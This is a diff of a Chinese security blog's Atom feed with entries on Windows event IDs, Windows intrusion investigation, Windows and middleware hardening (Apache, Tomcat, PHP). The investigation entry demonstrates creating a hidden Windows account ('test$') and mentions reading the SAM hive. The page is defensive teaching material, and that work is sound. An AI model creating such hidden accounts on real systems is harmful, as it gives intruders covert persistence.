+<p>/usr/local/tomcat9/conf/tomcat-users.xml</p>
+<p>/usr/local/tomcat9/conf/server.xml</p>
+<p>/usr/local/tomcat9/conf/web.xml</p>
+<h3>修改默认密码</h3>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>&lt;role rolename="manager-gui" /&gt;</span></span>
+<span class="line"><span>&lt;user username="tomcat" password="ETsafe666" roles="manager-gui"/&gt;</span></span>
+<span class="line"><span>&lt;/tomcat-users&gt;</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
+<h3>开启日志</h3>
+<p>server.xml</p>
+<p>关闭注释即可开启</p>
 <p>​​</p>
-<h5>密码策略</h5>
-<h6>密码最小长度限制</h6>
+<h3>修改端口</h3>
+<p>server.xml</p>
+<p>​MU</p>
+<h3>禁止目录列出</h3>
+<p>web.xml</p>
 <p>​​</p>
-<h6>密码复杂度要求</h6>
-<div class="language-linux line-numbers-mode" data-highlighter="shiki" data-ext="linux" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-linux"><span class="line"><span>如果启用此策略，密码必须符合下列最低要求: 启用</span></span>
-<span class="line"><span>不能包含用户的帐户名，不能包含用户姓名中超过两个连续字符的部分</span></span>
-<span class="line"><span>至少有六个字符长</span></span>
-<span class="line"><span>包含以下四类字符中的三类字符:</span></span>
-<span class="line"><span>英文大写字母(A 到 Z)</span></span>
-<span class="line"><span>英文小写字母(a 到 z)</span></span>
-<span class="line"><span>10 个基本数字(0 到 9)</span></span>
-<span class="line"><span>非字母字符(例如 !、$、#、%)</span></span>
-<span class="line"><span>在更改或创建密码时执行复杂性要求</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
-<h6>密码留存时间</h6>
+<h3>示例程序</h3>
+<p>删除路径：/usr/local/tomcat9/webapps下文件夹即可</p>
 <p>​​</p>
-<h6>强制密码历史</h6>
-<p>​​</p>
-<h5>账户锁定策略</h5>
-<h6>账户锁定时间</h6>
-<div class="language-linux line-numbers-mode" data-highlighter="shiki" data-ext="linux" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-linux"><span class="line"><span>锁定阈值：0-999分钟，0是永远不会锁定，建议设置10：登录失败10次后锁定账户</span></span>
-<span class="line"><span>时间和计数器：0永久锁定，其余是时间</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
-<h6>账户锁定阈值</h6>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">帐户锁定调值</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">此安全设置确定导致用户帐户被锁定的登录尝试失败的次数。在管</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">理员重置锁定帐户或帐户锁定时间期满之前，无法使用该锁定帐户</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">。可以将登录尝试失败次数设置为介于0和999之间的值。如果</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">将值设置为0，则永远不会锁定帐户。</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">在使用Ctrl</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">+</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">Alt</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">+</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">Dl或密码保护的屏幕保护程序锁定的工作站或</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">成员服务器上的密码尝试失败将计作登录尝试失败。</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">默认值：</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
-<h4>本地策略</h4>
-<p>​​</p>
-<h5>审核策略</h5>
-<p>​​</p>
-<p>日志记录设置</p>
-<p>​​</p>
-<h5>用户权限分配</h5>
-<h6>从远程系统强制关机</h6>
-<p>安全推荐配置：远程关机只能管理员组或禁用。</p>
-<p>​​</p>
-<h6>关闭系统</h6>
-<p>添加可以关闭系统的用户或组</p>
-<p>​​</p>
-<h6>取得文件或其他对象的使用权</h6>
-<p>默认admin 检查是否有新增用户</p>
-<p>​​</p>
-<p>​​</p>
-<h6>允许本地登录</h6>
-<p>根据业务需要修改</p>
-<p>​​</p>
-<h6>允许通过远程桌面服务登录</h6>
-<p>根据业务修改</p>
-<p>​​</p>
-<h6>从网络访问计算机</h6>
-<p>​​</p>
-<h5>安全选项</h5>
-<p>设置暂停会话前所需空闲时间数量</p>
-<p>​​</p>
-<h4>其他</h4>
-<ol>
-<li>
-<p>安装企业级防病毒软件 病毒库跟新、</p>
-</li>
-<li>
-<p>屏幕保护程序设置密码</p>
-</li>
-<li>
-<p>安全更新补丁（方法因系统而异）</p>
-<p>Windows 10 ：设置--安全更新--windows更新--高级选项--接收更新</p>
-<p>Windows other ↓ ：</p>
-<p>​​</p>
-</li>
-</ol>
-]]></content>
+<h2>PHP安全加固</h2>
+<p>配置文件名：/etc/php.ini</p>
+<h5>安全模式</h5>
+<p>以下4项目配套使用</p>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>safe_mode = on  #开启安全模式</span></span>
+<span class="line"><span>safe_mode_exec_dir= /var/www/html/  #设置安全模式下执行程序的目录</span></span>
+<span class="line"><span>safe_mode_gid = off #关闭网站目录下的操作权限</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content>
     <category term="应急响应"/>
     <published>2024-10-14T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">windows日志ID速查</title>
-    <id>https://min168.top/response/windows%E6%97%A5%E5%BF%97ID%E9%80%9F%E6%9F%A5.html</id>
-    <link href="https://min168.top/response/windows%E6%97%A5%E5%BF%97ID%E9%80%9F%E6%9F%A5.html"/>
-    <updated>2025-01-12T13:43:01.000Z</updated>
+    <title type="text">Windows日志ID速查手册</title>
+    <id>https://min168.top/response/Windows%E6%97%A5%E5%BF%97ID%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C.html</id>
+    <link href="https://min168.top/response/Windows%E6%97%A5%E5%BF%97ID%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<p><a href="https://www.cnblogs.com/Yang34/p/13453210.html" title="发布于 2020-08-07 15:33" target="_blank" rel="noopener noreferrer">WINDOWS日志事件ID速查表</a></p>
 <h2>类别:帐户管理</h2>
 <h3>子类别:应用程序组管理</h3>
@@ -11938,108 +11804,199 @@ systemctl restart sshd			#service sshd restart</p>
     <published>2024-10-14T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">中间件加固</title>
-    <id>https://min168.top/response/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%8A%A0%E5%9B%BA.html</id>
-    <link href="https://min168.top/response/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%8A%A0%E5%9B%BA.html"/>
-    <updated>2025-01-12T13:43:01.000Z</updated>
-    <summary type="html"><![CDATA[<h3>apache  --httpd</h3>
-<p>配置文件路径:/etc/httpd/conf/httpd.conf</p>
-<p>日志文件路径:/var/log/httpd</p>
-<h4>查看是否有apache账号</h4>
+    <title type="text">Windows系统入侵排查实战手册</title>
+    <id>https://min168.top/response/Windows%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E5%AE%9E%E6%88%98%E6%89%8B%E5%86%8C.html</id>
+    <link href="https://min168.top/response/Windows%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E5%AE%9E%E6%88%98%E6%89%8B%E5%86%8C.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
+    <summary type="html"><![CDATA[<p>1、入侵特点</p>
+<p>2、走哪里入侵</p>
+<p>3、针对性的排查</p>
+<p>主要关注：进程、账号、网络活动、启动项目、日志</p>
+<h2>1、口令、端口</h2>
+<p>检查：询问管理员、通过注册表；nmap扫描（或者询问管理员的资产台账中的端口信息）</p>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>namp -p1-65535  -sV IP</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></summary>
+    <content type="html"><![CDATA[<p>1、入侵特点</p>
+<p>2、走哪里入侵</p>
+<p>3、针对性的排查</p>
+<p>主要关注：进程、账号、网络活动、启动项目、日志</p>
+<h2>1、口令、端口</h2>
+<p>检查：询问管理员、通过注册表；nmap扫描（或者询问管理员的资产台账中的端口信息）</p>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>namp -p1-65535  -sV IP</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>如果能登录服务器：</p>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>netstat -ano</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>C:\Users\root&gt;netstat -ano</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>活动连接</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>  协议  本地地址          外部地址        状态           PID</span></span>
+<span class="line"><span>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       984</span></span>
+<span class="line"><span>  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span></span>
+<span class="line"><span>  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       516</span></span>
+<span class="line"><span>  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       776</span></span>
+<span class="line"><span>  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       628</span></span>
+<span class="line"><span>  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1272</span></span>
+<span class="line"><span>  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1600</span></span>
+<span class="line"><span>  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2708</span></span>
+<span class="line"><span>  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       768</span></span>
+<span class="line"><span>  TCP    0.0.0.0:55888          0.0.0.0:0              LISTENING       6112</span></span>
+<span class="line"><span>  TCP    127.0.0.1:53000        0.0.0.0:0              LISTENING       5936</span></span>
+<span class="line"><span>  TCP    192.168.188.128:139    0.0.0.0:0              LISTENING       4</span></span>
+<span class="line"><span>  TCP    192.168.188.128:62482  20.198.162.76:443      ESTABLISHED     3448</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>2 可疑账号</h2>
+<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">法1</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> user</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">法2</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lusrmgr.msc</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">法3</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">regedit</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003E9</p>
+<p>注意：要先给SAM文件当前用户的读取权限</p>
+<p>2.4 D盾查看是否存在克隆账号、隐藏账号</p>
+<p>test$   隐藏账号</p>
+<h1>克隆账号和隐藏账号如何创建★必会</h1>
+<p>1、创建普通隐藏账号</p>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>C:\Windows\system32&gt;net user test$ test123 /add</span></span>
+<span class="line"><span>命令成功完成。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>C:\Windows\system32&gt;net user</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>\\DESKTOP-6N9H4HS 的用户帐户</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content>
+    <category term="应急响应"/>
+    <published>2024-10-18T00:00:00.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">Windows系统安全加固实战指南</title>
+    <id>https://min168.top/response/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97.html</id>
+    <link href="https://min168.top/response/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
+    <summary type="html"><![CDATA[<h3>计算机管理</h3>
+<h4>本地用户和组</h4>
+<h6>禁用账户</h6>
+<p>禁用guest（来宾用户） 删除其他用户（先核查再删除）</p>
 <p>​​</p>
-<h4>限制目录及子目录权限</h4>
-<p>chmod -R 600 /etc/httpd/    (目录下文件全为600)</p>
+<p>图标有向下箭头标识被禁用。</p>
 <p>​​</p>
-<p>单独配置文件设置权限</p>
-<p>chmod 600 /etc/httpd/conf/httpd.conf</p>
-<h4>日志配置</h4>
-<p>配置文件路径:/etc/httpd/conf/httpd.conf</p>]]></summary>
-    <content type="html"><![CDATA[<h3>apache  --httpd</h3>
-<p>配置文件路径:/etc/httpd/conf/httpd.conf</p>
-<p>日志文件路径:/var/log/httpd</p>
-<h4>查看是否有apache账号</h4>
+<h6>不显示最后登录名</h6>
 <p>​​</p>
-<h4>限制目录及子目录权限</h4>
-<p>chmod -R 600 /etc/httpd/    (目录下文件全为600)</p>
+<h3>本地安全策略</h3>
 <p>​​</p>
-<p>单独配置文件设置权限</p>
-<p>chmod 600 /etc/httpd/conf/httpd.conf</p>
-<h4>日志配置</h4>
-<p>配置文件路径:/etc/httpd/conf/httpd.conf</p>
-<p>日志文件路径:/var/log/httpd</p>
+<h4>账户策略</h4>
 <p>​​</p>
-<p><strong>注意：所有配置重启服务生效★</strong></p>
-<p><span data-type="text" style="color: var(--b3-font-color10);">systemctl start httpd</span></p>
-<h6>错误日志配置路径和记录等级</h6>
+<h5>密码策略</h5>
+<h6>密码最小长度限制</h6>
 <p>​​</p>
-<h5>使用apachel用户组和apachel用户</h5>
-<p>使用apachel用户组和apachel用户启动中间件防止越权</p>
+<h6>密码复杂度要求</h6>
+<div class="language-linux line-numbers-mode" data-highlighter="shiki" data-ext="linux" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-linux"><span class="line"><span>如果启用此策略，密码必须符合下列最低要求: 启用</span></span>
+<span class="line"><span>不能包含用户的帐户名，不能包含用户姓名中超过两个连续字符的部分</span></span>
+<span class="line"><span>至少有六个字符长</span></span>
+<span class="line"><span>包含以下四类字符中的三类字符:</span></span>
+<span class="line"><span>英文大写字母(A 到 Z)</span></span>
+<span class="line"><span>英文小写字母(a 到 z)</span></span>
+<span class="line"><span>10 个基本数字(0 到 9)</span></span>
+<span class="line"><span>非字母字符(例如 !、$、#、%)</span></span>
+<span class="line"><span>在更改或创建密码时执行复杂性要求</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></summary>
+    <content type="html"><![CDATA[<h3>计算机管理</h3>
+<h4>本地用户和组</h4>
+<h6>禁用账户</h6>
+<p>禁用guest（来宾用户） 删除其他用户（先核查再删除）</p>
 <p>​​</p>
-<h5>禁止显示Apache目录列表</h5>
-<p>Options Indexes FollowSymLinks   (未注释会列出)</p>
+<p>图标有向下箭头标识被禁用。</p>
 <p>​​</p>
-<h5>拒绝服务-超时退出</h5>
-<div class="language-apache line-numbers-mode" data-highlighter="shiki" data-ext="apache" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-apache"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">Timeout</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 10</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> #客户端和服务端建立链接超时的时间间隔</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">keepAlive on #存活开启</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">keepAliveTimeout </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">300</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> #限制每一个用户生存时间5分钟...根据实际业务情况</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
-<h5>隐藏中间件信息</h5>
-<div class="language-apache line-numbers-mode" data-highlighter="shiki" data-ext="apache" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-apache"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">ServerSignature</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> Off</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">serverTokens Prod</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">TraceEnable</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> Off</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
+<h6>不显示最后登录名</h6>
 <p>​​</p>
-<h5>禁用CGI</h5>
-<p>（注释掉即禁用）</p>
+<h3>本地安全策略</h3>
 <p>​​</p>
-<h5>禁用非法的HTTP服务</h5>
-<p>(设了白名单)</p>
-<div class="language-apache line-numbers-mode" data-highlighter="shiki" data-ext="apache" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-apache"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;Location </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;LimitExcept </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">GET POST CONNECT OPTIONS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">Order</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> allow,deny</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">Deny</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> from all</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/LimitExcept&gt;</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/Location&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
-<h2>tomcat</h2>
-<p>配置文件：</p>
-<p>/usr/local/tomcat9/conf/tomcat-users.xml</p>
-<p>/usr/local/tomcat9/conf/server.xml</p>
-<p>/usr/local/tomcat9/conf/web.xml</p>
-<h3>修改默认密码</h3>
-<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>&lt;role rolename="manager-gui" /&gt;</span></span>
-<span class="line"><span>&lt;user username="tomcat" password="ETsafe666" roles="manager-gui"/&gt;</span></span>
-<span class="line"><span>&lt;/tomcat-users&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
-<h3>开启日志</h3>
-<p>server.xml</p>
-<p>关闭注释即可开启</p>
+<h4>账户策略</h4>
 <p>​​</p>
-<h3>修改端口</h3>
-<p>server.xml</p>
-<p>​MU</p>
-<h3>禁止目录列出</h3>
-<p>web.xml</p>
+<h5>密码策略</h5>
+<h6>密码最小长度限制</h6>
 <p>​​</p>
-<h3>示例程序</h3>
-<p>删除路径：/usr/local/tomcat9/webapps下文件夹即可</p>
+<h6>密码复杂度要求</h6>
+<div class="language-linux line-numbers-mode" data-highlighter="shiki" data-ext="linux" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-linux"><span class="line"><span>如果启用此策略，密码必须符合下列最低要求: 启用</span></span>
+<span class="line"><span>不能包含用户的帐户名，不能包含用户姓名中超过两个连续字符的部分</span></span>
+<span class="line"><span>至少有六个字符长</span></span>
+<span class="line"><span>包含以下四类字符中的三类字符:</span></span>
+<span class="line"><span>英文大写字母(A 到 Z)</span></span>
+<span class="line"><span>英文小写字母(a 到 z)</span></span>
+<span class="line"><span>10 个基本数字(0 到 9)</span></span>
+<span class="line"><span>非字母字符(例如 !、$、#、%)</span></span>
+<span class="line"><span>在更改或创建密码时执行复杂性要求</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
+<h6>密码留存时间</h6>
 <p>​​</p>
-<h2>PHP安全加固</h2>
-<p>配置文件名：/etc/php.ini</p>
-<h5>安全模式</h5>
-<p>以下4项目配套使用</p>
-<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>safe_mode = on  #开启安全模式</span></span>
-<span class="line"><span>safe_mode_exec_dir= /var/www/html/  #设置安全模式下执行程序的目录</span></span>
-<span class="line"><span>safe_mode_gid = off #关闭网站目录下的操作权限</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content>
+<h6>强制密码历史</h6>
+<p>​​</p>
+<h5>账户锁定策略</h5>
+<h6>账户锁定时间</h6>
+<div class="language-linux line-numbers-mode" data-highlighter="shiki" data-ext="linux" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-linux"><span class="line"><span>锁定阈值：0-999分钟，0是永远不会锁定，建议设置10：登录失败10次后锁定账户</span></span>
+<span class="line"><span>时间和计数器：0永久锁定，其余是时间</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
+<h6>账户锁定阈值</h6>
+<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">帐户锁定调值</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">此安全设置确定导致用户帐户被锁定的登录尝试失败的次数。在管</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">理员重置锁定帐户或帐户锁定时间期满之前，无法使用该锁定帐户</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">。可以将登录尝试失败次数设置为介于0和999之间的值。如果</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">将值设置为0，则永远不会锁定帐户。</span></span>
